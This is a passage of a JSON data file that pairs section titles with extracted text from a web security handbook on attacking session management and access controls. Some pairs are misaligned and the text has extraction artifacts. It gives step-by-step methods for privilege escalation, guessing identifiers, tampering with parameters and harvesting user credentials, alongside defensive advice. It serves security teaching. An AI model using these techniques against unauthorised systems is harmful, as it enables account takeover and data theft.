reauthenticate"
  },
  {
    "input": "Chapter Summary",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 213\nChapter 7 ■ Attacking Session Management 213\nevery time they submit an invalid request can slow down the process of prob-\ning the application for vulnerabilities by many orders of magnitude, even\nwhere automated techniques are employed. If residual vulnerabilities do still\nexist, they are far less likely to be discovered by anyone in the field.\nWhere this kind of defense is implemented, it is also recommended that it\ncan be easily switched off for testing purposes. If a legitimate penetration test\nof the application is slowed down in the same way as a real-world attacker,\nthen its effectiveness is dramatically reduced, and it is very likely that the pres-\nence of the mechanism will result in more vulnerabilities remaining in pro-\nduction code than if the mechanism were absent.\nHACK STEPS\nIf the application you are attacking uses this kind of defensive measure, you\nmay find that probing the application for many kinds of common vulnerability\nis extremely time-consuming, and the mind-numbing need to log in after each\nfailed test and renavigate to the point of the application you were looking at\nquickly leads you to give up.\nIn this situation, you can often use automation to tackle the problem. When\nusing Burp Intruder to perform an attack, you can use the Obtain Cookie\nfeature to perform a fresh login before sending each test case, and use the new\nsession token (provided that the login is single-stage). When browsing and\nprobing the application manually, you can use the extensibility features of Burp\nProxy via the IBurpExtenderinterface. You can create an extension which\ndetects when the application has performed a forced logout, automatically logs\nback in to the application, and returns the new session and page to the\nbrowser, optionally with a pop-up message to inform you of what has occurred.\nWhile this by no means removes the problem altogether, in certain cases it can\nmitigate it substantially.\nChapter Summary\nThe session management mechanism provides a rich source of potential vul-\nnerabilities for you to target when formulating your attack against an applica-\ntion. Because of its fundamental role in enabling the application to identify the\nsame user across multiple requests, a broken session management function\nusually provides the keys to the kingdom. Jumping into other users’ sessions\nis good; hijacking an administrator’s session is even better, and will typically\nenable you to compromise the entire application.\nYou can expect to encounter a wide range of defects in real-world session\nmanagement functionality. When bespoke mechanisms are employed, the\npossible weaknesses and avenues of attack may appear to be endless. The"
  },
  {
    "input": "Questions",
    "output": "70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 214\n214 Chapter 7 ■ Attacking Session Management\nmost important lesson to draw from this topic is to be patient and determined.\nVery many session management mechanisms that appear to be robust on first\ninspection can be found wanting when analyzed closely. Deciphering the\nmethod which an application uses to generate its sequence of seemingly ran-\ndom tokens may take time and ingenuity. But given the reward, this is usually\nan investment well worth making.\nQuestions\nAnswers can be found at www.wiley.com/go/webhacker.\n1. You log in to an application and the server sets the following cookie:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODcwODYz;\nAn hour later, you log in again and receive the following:\nSet-cookie: sessid=amltMjM6MTI0MToxMTk0ODc1MTMy;\nWhat can you deduce about these cookies?\n2. An application employs six-character alphanumeric session tokens and\nfive-character alphanumeric passwords. Both are randomly generated\naccording to an unpredictable algorithm. Which of these is likely to be\nthe most worthwhile target for a brute force guessing attack? List all of\nthe different factors that may be relevant to your decision.\n3. You log in to an application at the following URL:\nhttps://foo.wahh-app.com/login/home.php\nand the server sets the following cookie:\nSet-cookie: sessionId=1498172056438227; domain=foo.wahh-\napp.com; path=/login; HttpOnly;\nYou then visit a range of other URLs. Which of the following will your\nbrowser submit the sessionIdcookie to? (Select all that apply.)\n(a) https://foo.wahh-app.com/login/myaccount.php\n(b) https://bar.wahh-app.com/login\n(c) https://staging.foo.wahh-app.com/login/home.php\n(d) http://foo.wahh-app.com/login/myaccount.php\n(e) http://foo.wahh-app.com/logintest/login.php\n(f) https://foo.wahh-app.com/logout\n(g) https://wahh-app.com/login/\n(h) https://xfoo.wahh-app.com/login/myaccount.php\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 215\nChapter 7 ■ Attacking Session Management 215\n4. The application you are targeting uses per-page tokens, in addition to\nthe primary session token. If a per-page token is received out of\nsequence, then the entire session is invalidated. Suppose that you dis-\ncover some defect that enables you to predict or capture the tokens\nissued to other users who are currently accessing the application. Are\nyou able to hijack their sessions?\n5. You log in to an application and the server sets the following cookie:\nSet-cookie: sess=ab11298f7eg14;\nWhen you click the logout button, this causes the following client-side\nscript to execute:\ndocument.cookie=”sess=”;\ndocument.location=”/“;\nWhat conclusion would you draw from this behavior?\n70779c07.qxd:WileyRed 9/14/07 3:13 PM Page 216"
  },
  {
    "input": "Chapter 8: Attacking Access Controls",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 217\nCHAPTER\n8\nAttacking Access Controls\nWithin the application’s core security mechanisms, access controls are logi-\ncally built upon authentication and session management. So far, you have seen\nhow an application can first verify a user’s identity and then confirm that a\nparticular sequence of requests that it receives originated from the same user.\nThe primary reason that the application needs to do these things, in terms of\nsecurity at least, is because it needs a way of deciding whether it should per-\nmit a given request to perform its attempted action or access the resources that\nit is requesting. Access controls are a critical defense mechanism within the\napplication because they are responsible for making these key decisions.\nWhen they are defective, an attacker can often compromise the entire applica-\ntion, taking control of administrative functionality and accessing sensitive\ndata belonging to every other user.\nAs we noted in Chapter 1, broken access controls are among the most com-\nmonly encountered categories of web application vulnerability, affecting a\nmassive 78% of the applications recently tested by the authors. Somewhat\nincredibly, it is extremely common to encounter applications that go to all the\ntrouble of implementing robust mechanisms for authentication and session\nmanagement, only to squander that investment by neglecting to build any\neffective access controls upon them.\nAccess control vulnerabilities are conceptually very simple: the application\nis letting you do something you shouldn’t be able to. The differences between\nseparate flaws really come down to the different ways in which this core defect\n217"
  },
  {
    "input": "Common Vulnerabilities",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 218\n218 Chapter 8 ■ Attacking Access Controls\nis manifested, and the different techniques you need to employ to detect it. We\nwill describe all of these techniques, showing how you can exploit different\nkinds of behavior within an application to perform unauthorized actions and\naccess protected data.\nCommon Vulnerabilities\nAccess controls can be divided into two broad categories: vertical and horizontal.\nVertical access controls allow different types of users to access different\nparts of the application’s functionality. In the simplest case, this typically\ninvolves a division between ordinary users and administrators. In more com-\nplex cases, vertical access controls may involve fine-grained user roles grant-\ning access to specific functions, with each user being allocated to a single role,\nor a combination of different roles.\nHorizontal access controls allow users to access a certain subset of a wider\nrange of resources of the same type. For example, a web mail application may\nallow you to read your email but no one else’s; an online bank may let you\ntransfer money out of your account only; and a workflow application may\nallow you to update tasks assigned to you but only read tasks assigned to\nother people.\nIn many cases, vertical and horizontal access controls are intertwined. For\nexample, an enterprise resource planning application may allow each accounts\npayable clerk to pay invoices for a specific organizational unit and no other. The\naccounts payable manager, on the other hand, may be allowed to pay invoices\nfor any unit. Similarly, clerks may be able to pay invoices for small amounts,\nwhile larger invoices must be paid by the manager. The finance director may be\nable to view invoice payments and receipts for every organizational unit in the\ncompany but may not be permitted to pay any invoices at all.\nAccess controls are broken if any user is able to access functionality or\nresources for which he is not authorized. There are two main types of attack\nagainst access controls, corresponding to the two categories of control:\n■■ Vertical privilege escalationoccurs when a user can perform functions\nthat their assigned role does not permit them to. For example, if an\nordinary user can perform administrative functions or a clerk is able to\npay invoices of any size, then access controls are broken.\n■■ Horizontal privilege escalationoccurs when a user can view or modify\nresources to which he is not entitled. For example, if you can use a web\nmail application to read other people’s email, or if a payment clerk can\nprocess invoices for an organizational unit other than his own, then\naccess controls are broken.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 219\nChapter 8 ■ Attacking Access Controls 219\nIt is common to find cases where a vulnerability in the application’s hori-\nzontal separation of privileges can lead immediately to a vertical escalation\nattack. For example, if a user finds a way to set a different user’s password,\nthen the user can attack an administrative account and take control of the\napplication.\nIn the cases described so far, broken access controls enable users who have\nauthenticated themselves to the application in a particular user context to per-\nform actions or access data for which that context does not authorize them.\nHowever, in the most serious cases of broken access control, it may be possible\nfor completely unauthorized users to gain access to functionality or data that\nis intended to be accessed only by privileged authenticated users.\nCompletely Unprotected Functionality\nIn many cases of broken access controls, sensitive functionality and resources\ncan be accessed by anyone who knows the relevant URL. For example, there\nare many applications in which anyone who visits a specific URL is able to\nmake full use of its administrative functions:\nhttps://wahh-app.com/admin/\nIn this situation, the application typically enforces access control only to the\nfollowing extent: users who have logged in as administrators see a link to this\nURLon their user interface, while other users do not. This cosmetic difference\nis the only mechanism in place to “protect” the sensitive functionality from\nunauthorized use.\nSometimes, the URL that grants access to powerful functions may be less\neasy to guess, and may even be quite cryptic, for example:\nhttps://wahh-app.com/menus/secure/ff457/DoAdminMenu2.jsp\nHere, access to administrative functions is protected by the assumption that\nan attacker will not know or discover this URL. The application is harder for a\ncomplete outsider to compromise, because they are less likely to guess the\nURLby which they can do so.\nCOMMON MYTH “No low-privileged users will know that URL. We don’t\nreference it anywhere within the application.”\nIn the example just described, the absence of any genuine access control still\nconstitutes a serious vulnerability, regardless of how easy it would be to guess\nthe URL. URLs do not have the status of secrets, either within the application\nitself or in the hands of its users. They are displayed on-screen, and appear in\nbrowser histories and the logs of web servers and proxy servers. Users may write\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 220\n220 Chapter 8 ■ Attacking Access Controls\nthem down, bookmark them, or email them around. They are not normally\nchanged periodically, as passwords should be. When users change job roles, and\ntheir access to administrative functionality needs to be withdrawn, there is no\nway to delete their knowledge of a particular URL.\nIn some applications where sensitive functionality is hidden behind URLs\nthat are not trivial to guess, an attacker may often be able to identify these via\nclose inspection of client-side code. Many applications use JavaScript to build\nthe user interface dynamically within the client. This typically works by set-\nting various flags regarding the user’s status, and then adding individual ele-\nments to the UI on the basis of these. For example:\nvar isAdmin = false;\n...\nif (isAdmin)\n{\nadminMenu.addItem(“/menus/secure/ff457/addNewPortalUser2.jsp”,\n“create a new user”);\n}\nHere, an attacker can simply review the JavaScript to identify URLs for\nadministrative functionality and attempt to access these. In other cases, HTML\ncomments may contain references to or clues about URLs that are not linked\nfrom on-screen content. See Chapter 4 for a discussion of the various tech-\nniques by which an attacker can gather information about hidden content\nwithin the application.\nIdentifier-Based Functions\nWhen a function of an application is used to gain access to a specific resource,\nit is very common to see an identifier for the requested resource being passed\nto the server in a request parameter, either within the URLquery string or the\nbody of a POST request. For example, an application may use the following\nURLto display a specific document belonging to a particular user:\nhttps://wahh-app.com/ViewDocument.php?docid=1280149120\nWhen the user who owns the document is logged in, a link to this URLis\ndisplayed on the user’s My Documents page. Other users do not see the link.\nHowever, if access controls are broken, then any user who requests the rele-\nvant URLmay be able to view the document in exactly the same way as the\nauthorized user.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 221\nChapter 8 ■ Attacking Access Controls 221\nTIP This type of vulnerability often arises when the main application is\ninterfacing to an external system or back-end component. It can be difficult to\nshare a session-based security model between different systems that may be\nbased on diverse technologies. Faced with this problem, developers frequently\ntake a shortcut and move away from that model, using client-submitted\nparameters to make access control decisions.\nIn this example, an attacker seeking to gain unauthorized access needs to\nknow not only the name of the application page (ViewDocument.php) but also\nthe identifier of the document he wishes to view. Sometimes, resource identi-\nfiers are generated in a highly unpredictable manner—for example, they may\nbe randomly chosen GUIDs. In other cases, they may be easily guessed—for\nexample, they may be sequentially generated numbers. However, the applica-\ntion is vulnerable in both cases. As described previously, URLs do not have the\nstatus of secrets, and the same applies to resource identifiers. Often, an\nattacker wishing to discover the identifiers of other users’ resources will find\nsome location within the application that discloses these, such as access logs.\nEven where an application’s resource identifiers cannot be easily guessed, it is\nstill vulnerable if it fails to properly control access to those resources. In cases\nwhere the identifiers are easily predicted, the problem is even more serious\nand more easily exploited.\nTIP Application logs are often a gold mine of information, and may contain\nnumerous items of data that can be used as identifiers to probe functionality\nthat is accessed in this way. Identifiers commonly found within application logs\ninclude: usernames, user ID numbers, account numbers, document IDs, user\ngroups and roles, and email addresses.\nNOTE In addition to being used as references to data-based resources\nwithin the application, this kind of identifier is also often used to refer to\nfunctions of the application itself. As you saw in Chapter 4, an application may\ndeliver different functions via a single page, which accepts a function name or\nidentifier as a parameter. Again in this situation, access controls may run no\ndeeper than the presence or absence of specific URLs within the interfaces\nof different types of user. If an attacker can determine the identifier for a\nsensitive function, he may be able to access it in just the same way as a\nmore privileged user.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 222\n222 Chapter 8 ■ Attacking Access Controls\nMultistage Functions\nMany kinds of functions within an application are implemented across several\nstages, involving multiple requests being sent from the client to the server. For\nexample, a function to add a new user may involve choosing this option from\na user maintenance menu, selecting the department and user role from drop-\ndown lists, and then entering the new username, initial password, and other\ninformation.\nIt is common to encounter applications in which efforts have been made to\nprotect this kind of sensitive functionality from unauthorized access but where\nthe access controls employed are broken because of flawed assumptions about\nthe ways in which the functionality will be used.\nIn the previous example, when a user attempts to load the user maintenance\nmenu, and chooses the option to add a new user, the application may verify\nthat the user has the required privileges, and block access if the user does not.\nHowever, if an attacker proceeds directly to the stage of specifying the user’s\ndepartment and other details, there may be no effective access control. The\ndevelopers unconsciously assumed that any user who reaches the later stages\nof the process must have the relevant privileges because this was verified at\nthe earlier stages. The result is that any user of the application can add a new\nadministrative user account, and thereby take full control of the application,\ngaining access to many other functions whose access control is intrinsically\nrobust.\nThe authors have encountered this type of vulnerability even in the most\nsecurity-critical web applications, those deployed by online banks. Making a\nfunds transfer in a banking application typically involves multiple stages,\npartly to prevent users from accidentally making mistakes when requesting a\ntransfer. This multistage process involves capturing different items of data\nfrom the user at each stage. This data is strictly checked when first submitted\nand then is usually passed to each subsequent stage, using hidden fields in an\nHTMLform. However, if the application does not revalidate all of this data at\nthe final stage, then an attacker can potentially bypass the server’s checks. For\nexample, the application might verify that the source account selected for the\ntransfer belongs to the current user and then ask for details about the destina-\ntion account and the amount of the transfer. If a user intercepts the final POST\nrequest of this process and modifies the source account number, she can exe-\ncute a horizontal privilege escalation and transfer funds out of an account\nbelonging to a different user.\nStatic Files\nIn the majority of cases, users gain access to protected functionality and\nresources by issuing requests to dynamic pages that execute on the server. It is\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 223\nChapter 8 ■ Attacking Access Controls 223\nthe responsibility of each such page to perform suitable access control checks,\nand confirm that the user has the relevant privileges to perform the action that\nthey are attempting.\nHowever, in some cases, requests for protected resources are made directly\nto the static resources themselves, which are located within the web root of the\nserver. For example, an online publisher may allow users to browse its book\ncatalog and purchase ebooks for download. Once payment has been made, the\nuser is directed to a download URLlike the following:\nhttps://wahh-books.com/download/0636628104.pdf\nBecause this is a completely static resource, it does not execute on the server,\nand its contents are simply returned directly by the web server. Hence, the\nresource itself cannot implement any logic to verify that the requesting user\nhas the required privileges. When static resources are accessed in this way, it is\nhighly likely that there are no effective access controls protecting them and\nthat anyone who knows the URLnaming scheme can exploit this to access any\nresources they desire. In the present case, the document name looks suspi-\nciously like an ISBN, which would enable an attacker to quickly download\nevery ebook produced by the publisher!\nCertain types of functionality are particularly prone to this kind of problem,\nincluding financial web sites providing access to static documents about com-\npanies such as annual reports, software vendors who provide downloadable\nbinaries, and administrative functionality that provides access to static log\nfiles and other sensitive data collected within the application.\nInsecure Access Control Methods\nSome applications employ a fundamentally insecure access control model in\nwhich access control decisions are made on the basis of request parameters\nsubmitted by the client. In some versions of this model, the application deter-\nmines a user’s role or access level at the time of login and from this point\nonwards transmits this information via the client in a hidden form field,\ncookie, or preset query string parameter (see Chapter 5). When each subse-\nquent request is processed, the application reads this request parameter and\ndecides what access to grant the user accordingly.\nFor example, an administrator using the application may see URLs like the\nfollowing:\nhttps://wahh-app.com/login/home.jsp?admin=true\nwhile the URLs seen by ordinary users contain a different parameter, or none\nat all. Any user who is aware of the parameter assigned to administrators can"
  },
  {
    "input": "Attacking Access Controls",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 224\n224 Chapter 8 ■ Attacking Access Controls\nsimply set it in his own requests and thereby gain access to administrative\nfunctions.\nThis type of access control may sometimes be difficult to detect without\nactually using the application as a high-privileged user and identifying what\nrequests are made. The techniques described in Chapter 4 for discovering hid-\nden request parameters may be successful in discovering the mechanism\nwhen working only as an ordinary user.\nIn other unsafe access control models, the application uses the HTTP\nRefererheader as the basis for making access control decisions. For example,\nan application may strictly control access to the main administrative menu,\nbased on a user’s privileges. But when a user makes a request for an individ-\nual administrative function, the application may simply check whether this\nrequest was referred from the administrative menu page and assume that, if\nso, then the user must have accessed that page and so have the required priv-\nileges. This model is fundamentally broken, of course, because the Referer\nheader is completely within the control of the user and can be set to any value\nat all.\nAttacking Access Controls\nBefore starting to probe the application to detect any actual access control vul-\nnerabilities, you should take a moment to review the results of your applica-\ntion mapping exercises (see Chapter 4), to understand what the application’s\nactual requirements are in terms of access control, and therefore where it will\nprobably be most fruitful to focus your attention.\nHACK STEPS\nQuestions to consider when examining an application’s access controls include:\n■ Do application functions give individual users access to a particular sub-\nset of data that belongs to them?\n■ Are there different levels of user, such as managers, supervisors, guests,\nand so on, who are granted access to different functions?\n■ Do administrators use functionality that is built into the same application\nin order to configure and monitor it?\n■ What functions or data resources within the application have you\nidentified that would most likely enable you to escalate your current\nprivileges?\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 225\nChapter 8 ■ Attacking Access Controls 225\nThe easiest and most effective way to test the effectiveness of an applica-\ntion’s access controls is to access the application using different accounts, and\ndetermine whether resources and functionality that can be accessed legiti-\nmately by one account can be accessed illegitimately by another.\nHACK STEPS\n■ If the application segregates user access to different levels of functional-\nity, first use a powerful account to locate all of the available functionality\nand then attempt to access this using a lower-privileged account.\n■ If the application segregates user access to different resources (such as\ndocuments), use two different user-level accounts to test whether access\ncontrols are effective or whether horizontal privilege escalation is possi-\nble. Find a document that can be legitimately accessed by one user but\nnot by another, and attempt to access it using the second user’s\naccount—either by requesting the relevant URL or by submitting the\nsame POSTparameters from within the second user’s session.\n■ It may be possible to automate some of this testing by running a spider-\ning tool twice or more against the application, using a different user con-\ntext each time, and also in an unauthenticated context. To do this, run\nthe spider first as an administrator, and then obtain a session token for a\nlower-privileged user and resubmit the same linksbut replace the privi-\nleged session token with the lower-privileged token.\n■ If a spidering session running as an ordinary user discovers privileged\nfunctions to which only administrators should have access, then this may\nrepresent a vulnerability. Note, however, that the effectiveness of this\nmethod depends upon the exact behavior of the application: some appli-\ncations provide all users with the same navigation links and return an\n“access denied” message (in an HTTP 200 response) when an unautho-\nrized function is requested.\nIf you have only one user-level account with which to access the application\n(or none at all), then additional work needs to be done to test the effectiveness\nof access controls. In fact, to perform a fully comprehensive test, further work\nneeds to be done in any case, because poorly protected functionality may exist\nthat is not explicitly linked from the interface of any application user—for\nexample, old functionality that has not yet been removed, or new functionality\nthat has been deployed but has not yet been published to users.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 226\n226 Chapter 8 ■ Attacking Access Controls\nHACK STEPS\n■ Use the content discovery techniques described in Chapter 4 to identify\nas much of the application’s functionality as possible. Performing this\nexercise as a low-privileged user is often sufficient to both enumerate\nand gain direct access to sensitive functionality.\n■ Where application pages are identified that are likely to present different\nfunctionality or links to ordinary and administrative users (for example, a\nControl Panel or My Home Page), try adding parameters like admin=true\nto the URL query string and the body of POSTrequests, to determine\nwhether this uncovers or gives access to any additional functionality than\nyour user context has normal access to.\n■ Test whether the application uses the Refererheader as the basis for\nmaking access control decisions. For key application functions that you\nare authorized to access, try removing or modifying the Refererheader\nand determine whether your request is still successful. If not, the appli-\ncation may be trusting the Refererheader in an unsafe way.\n■ Review all client-side HTML and scripts to find references to hidden func-\ntionality or functionality that can be manipulated on the client side, such\nas script-based user interfaces.\nOnce all accessible functionality has been enumerated, it is necessary to test\nwhether per-user segregation of access to resources is being correctly enforced.\nIn every instance where the application grants users access to a subset of a\nwider range of resources of the same type (such as documents, orders, emails,\nand personal details), there may be opportunities for one user to gain unau-\nthorized access to other resources.\nHACK STEPS\n■ Where the application uses identifiers of any kind (document IDs,\naccount numbers, order references, etc.) to specify which resource a user\nis requesting, attempt to discover the identifiers for resources to which\nyou do not have authorized access.\n■ If it is possible to generate a series of such identifiers in quick succession\n(for example, by creating multiple new documents or orders), use the same\ntechniques as were described in Chapter 8 for session tokens, to try to dis-\ncover any predictable sequences in the identifiers the application produces.\n■ If it is not possible to generate any new identifiers, then you are\nrestricted to analyzingthe identifiers that you have already discovered,\nor even using plain guesswork. If the identifier has the form of a GUID, it\nis unlikely that any attempts based on guessing will be successful. How-\never, if it is a relatively small number, try other numbers in close range,\nor random numbers with the same number of digits.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 227\nChapter 8 ■ Attacking Access Controls 227\nHACK STEPS (continued)\n■ If access controls are found to be broken, and resource identifiers are\nfound to be predictable, you can mount an automated attack to harvest\nsensitive resources and information from the application. Use the tech-\nniques described in Chapter 13 to design a bespoke automated attack to\nretrieve the data you require.\nA catastrophic vulnerability of this kind occurs where an Account\nInformation page displays a user’s personal details together with his\nusername and password. While the password is typically masked on-screen,\nit is nevertheless transmitted in full to the browser. Here, you can often\nquickly iterate through the full range of account identifiers to harvest the\nlogin credentials of all users, including administrators. The following example\nshows Burp Intruder being used to carry out a successful attack of this kind.\nTIP When you have detected an access control vulnerability, an immediate\nattack to follow up with is to attempt to escalate your privileges further by\ncompromising a user account with administrative privileges. There are various\ntricks you can use in trying to locate an administrative account. Using an\naccess control flaw like the one illustrated, you may harvest hundreds of user\ncredentials and not relish the task of logging in manually as every user until an\nadministrator is found. However, when accounts are identified by a sequential\nnumeric ID, it is very common to find that the lowest account numbers are\nassigned to administrators. Logging in as the first few users who were\nregistered with the application will often identify an administrator. If this\napproach fails, an effective method is to find a function within the application\nwhere access is properly segregated horizontally—for example, the main home\npage presented to each user. Write a script to log in using each set of captured\ncredentials, and then try to access your own home page. It is likely that\nadministrative users are able to view the home page of every user, so you will\nimmediately detect when an administrative account is being used."
  },
  {
    "input": "Securing Access Controls",
    "output": "70779c08v6.5.qxd 9/14/07 3:18 PM Page 228\n228 Chapter 8 ■ Attacking Access Controls\nIn every instance where an application superficially appears to be enforcing\naccess controls effectively, you should probe further to determine whether any\ndefective assumptions have been made by developers.\nHACK STEPS\n■ Where an action is carried out in a multistep way, involving several dif-\nferent requests from client to server, test each request individually to\ndetermine whether access controls have been applied to it.\n■ Try to find any locations where the application is effectively assuming that\nif you have reached a particular point, then you must have arrived via legiti-\nmate means. Try to reach that point in other ways using a lower-privileged\naccount, to detect if any privilege escalation attacks are possible.\nIn cases where static resources that the application is protecting are ulti-\nmately accessed directly via URLs to the resource files themselves, you should\ntest whether it is possible for unauthorized users to simply request these URLs\ndirectly.\nHACK STEPS\n■ Step through the normal process for gaining access to a protected static\nresource, to obtain an example of the URL by which it is ultimately\nretrieved.\n■ Using a different user context (for example, a less-privileged user or an\naccount that has not made a required purchase), attempt to access the\nresource directly using the URL you have identified.\n■ If this attack succeeds, try to understand the naming scheme being used\nfor protected static files. If possible, construct an automated attack to\ntrawl for content that may be useful or contain sensitive data (see\nChapter 13).\nSecuring Access Controls\nAccess controls are one of the easiest areas of web application security to\nunderstand, although a well-informed, thorough methodology must be care-\nfully applied when implementing them.\nFirst, there are several obvious pitfalls to avoid. These usually arise from\nignorance about the essential requirements of effective access control or\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 229\nChapter 8 ■ Attacking Access Controls 229\nflawed assumptions about the kinds of requests that users will make and\nagainst which the application needs to defend itself:\n■■ Do not rely on users’ ignorance of application URLs or the identifiers\nused to specify application resources, such as account numbers and\ndocument IDs. Explicitly assume that users know every application\nURLand identifier, and ensure that the application’s access controls\nalone are sufficient to prevent unauthorized access.\n■■ Do not trust any user-submitted parameters to signify access rights\n(such as admin=true).\n■■ Do not assume that users will access application pages in the intended\nsequence. Do not assume that because users cannot access the Edit\nUsers page, they will not be able to reach the Edit User X page that is\nlinked from it.\n■■ Do not trust the user not to tamper with any data that is transmitted via\nthe client. If some user-submitted data has been validated and is then\ntransmitted via the client, do not rely upon the retransmitted value\nwithout revalidation.\nThe following represents a best-practice approach to implementing effective\naccess controls within web applications:\n■■ Explicitly evaluate and document the access control requirements for\nevery unit of application functionality. This needs to include both who\ncan legitimately use the function and what resources individual users\nmay access via the function.\n■■ Drive all access control decisions from the user’s session.\n■■ Use a central application component to check access controls.\n■■ Process every single client request via this component, to validate that\nthe user making the request is permitted to access the functionality and\nresources being requested.\n■■ Use programmatic techniques to ensure that there are no exceptions to\nthe previous point. An effective approach is to mandate that every\napplication page must implement an interface that is queried by the\ncentral access control mechanism. By forcing developers to explicitly\ncode access control logic into every page, there can be no excuse for\nomissions.\n■■ For particularly sensitive functionality, such as administrative pages,\nyou can further restrict access by IPaddress, to ensure that only users\nfrom a specific network range are able to access the functionality,\nregardless of their login status.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 230\n230 Chapter 8 ■ Attacking Access Controls\n■■ If static content needs to be protected, there are two methods of provid-\ning access control. First, static files can be accessed indirectly by passing\na file name to a dynamic server-side page which implements relevant\naccess control logic. Second, direct access to static files can be controlled\nusing HTTPauthentication or other features of the application server to\nwrap the incoming request and check the permissions for the resource\nbefore granting access.\n■■ Identifiers specifying which resource a user wishes to access are vulner-\nable to tampering whenever they are transmitted via the client. The\nserver should trust only the integrity of server-side data. Any time\nthese identifiers are transmitted via the client, they need to be revali-\ndated to ensure the user is authorized to access the requested resource.\n■■ For security-critical application functions such as the creation of a\nnew bill payee in a banking application, consider implementing per-\ntransaction reauthentication and dual authorization to provide addi-\ntional assurance that the function is not being used by an unauthorized\nparty. This will also mitigate the consequences of other possible attacks,\nsuch as session hijacking.\n■■ Log every event where sensitive data is accessed or a sensitive action is\nperformed. These logs will enable potential access control breaches to\nbe detected and investigated.\nWeb application developers often implement access control functions on a\npiecemeal basis, adding code to individual pages in cases where they register\nthat some access control is required, and often cutting and pasting the same\ncode between pages to implement similar requirements. This approach carries\nan inherent risk of defects in the resulting access control mechanism: many\ncases are overlooked where controls are required, controls designed for one\narea may not operate in the intended way in another area, and modifications\nmade elsewhere within the application may break existing controls by violat-\ning assumptions made by them.\nIn contrast to this approach, the previously described method of using a cen-\ntral application component to enforce access controls has many benefits:\n■■ It increases the clarity of access controls within the application,\nenabling different developers to quickly understand the controls imple-\nmented by others.\n■■ It makes maintainability more efficient and reliable. Most changes will\nonly need to be applied once, to a single shared component, and will\nnot need to be cut and pasted to multiple locations.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 231\nChapter 8 ■ Attacking Access Controls 231\n■■ It improves adaptability. Where new access control requirements arise,\nthese can be easily reflected within an existing API implemented by\neach application page.\n■■ It results in fewer mistakes and omissions than if access control code is\nimplemented piecemeal throughout the application.\nA Multi-Layered Privilege Model\nIssues relating to access apply not only to the web application itself but also to\nthe other infrastructure tiers which lie beneath it—in particular, the applica-\ntion server, the database, and the operating system. Taking a defense-in-depth\napproach to security entails implementing access controls at each of these lay-\ners to create several layers of protection. This provides greater assurance\nagainst threats of unauthorized access, because if an attacker succeeds in com-\npromising defenses at one layer, the attack may yet be blocked by defenses at\nanother layer.\nIn addition to implementing effective access controls within the web appli-\ncation itself, as already described, a multi-layered approach can be applied in\nvarious ways to the components which underlie the application, for example:\n■■ The application server can be used to control access to entire URL\npaths, on the basis of user roles that are defined at the application\nserver tier.\n■■ The application can employ a different database account when carrying\nout the actions of different users. For users who should only be query-\ning (and not updating) data, an account with read-only privileges\nshould be used.\n■■ Fine-grained control over access to different database tables can be\nimplemented within the database itself, using a table of privileges.\n■■ The operating system accounts used to run each component in the\ninfrastructure can be restricted to the least powerful privileges that the\ncomponent actually requires.\nIn a complex security-critical application, layered defenses of this kind can\nbe devised with the help of a matrix defining the different user roles within the\napplication and the different privileges, at each tier, that should be assigned to\neach role. Figure 8-1 is a partial example of a privilege matrix for a complex\napplication.\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 232\n232 Chapter 8 ■ Attacking Access Controls\nFigure8-1: Example of a privilege matrix for a complex application\nWithin a security model of this kind, you can see how various useful access\ncontrol concepts can be applied:\n■■ Programmatic control—The matrix of individual database privileges\nis stored in a table within the database, and applied programmatically\nto enforce access control decisions. The classification of user roles pro-\nvides a shortcut for applying certain access control checks, and this is\nalso applied programmatically. Programmatic controls can be extremely\nfine-grained and can build in arbitrarily complex logic into the process\nof carrying out access control decisions within the application.\n■■ Discretionary access control (DAC) —Administrators are able to dele-\ngate their privileges to other users in relation to specific resources that\nthey own, employing discretionary access control. This is a closed DAC\nmodel, in which access is denied unless explicitly granted. Administra-\ntors are also able to lock or expire individual user accounts. This is an\nopen DACmodel, in which access is permitted unless explicitly with-\ndrawn. Various application users have privileges to create user\naccounts, again applying discretionary access control.\n■■ Role-based access control (RBAC)—There are named roles, which\ncontain different sets of specific privileges, and each user is assigned to\none of these roles. This serves as a shortcut for assigning and enforcing\ndifferent privileges and is necessary to help manage access control in\ncomplex applications. Using roles to perform upfront access checks on\nuser requests enables many unauthorized requests to be quickly\n70779c08v6.5.qxd 9/14/07 3:18 PM Page 233\nChapter 8 ■ Attacking Access Controls 233\nrejected with a minimum amount of processing being performed. An\nexample of this approach is in protecting the URLpaths that specific\ntypes of user may access.\nWhen designing role-based access control mechanisms, it is necessary to\nbalance the number of roles so that they remain a useful tool to assist in\nthe management of privileges within the application. If too many fine-\ngrained roles are created, then the number of different roles becomes\nunwieldy, and they are difficult to manage accurately. If too few roles are\ncreated, the resulting roles will be a coarse instrument for managing\naccess, and it is likely that individual users will be assigned privileges\nthat are not strictly necessary for performance of their function.\n■■ Declarative control—The application uses restricted database\naccounts when accessing the database. It employs different accounts\nfor different groups of users, with each account having the least level of\nprivilege necessary for carrying out the actions which that group is per-\nmitted to perform. Declarative controls of this kind are declared from\noutside the application. This is a very useful application of defense-in-\ndepth principles, because privileges are being imposed on the applica-\ntion by a different component. Even if a user finds a means of breaching\nthe access controls implemented within the application tier, so as to\nperform a sensitive action such as adding a new user, they will be pre-\nvented from doing so because the database account that they are using\ndoes not have the required privileges within the database.\nAdifferent means of applying declarative access control exists at the\napplication server level, via deployment descriptor files, which are\napplied during application deployment. However, these can be rela-\ntively blunt instruments and do not always scale well to manage fine-\ngrained privileges in a large application.\nHACK STEPS\nIf you are attacking an application that employs a multi-layered privilege model\nof this kind, 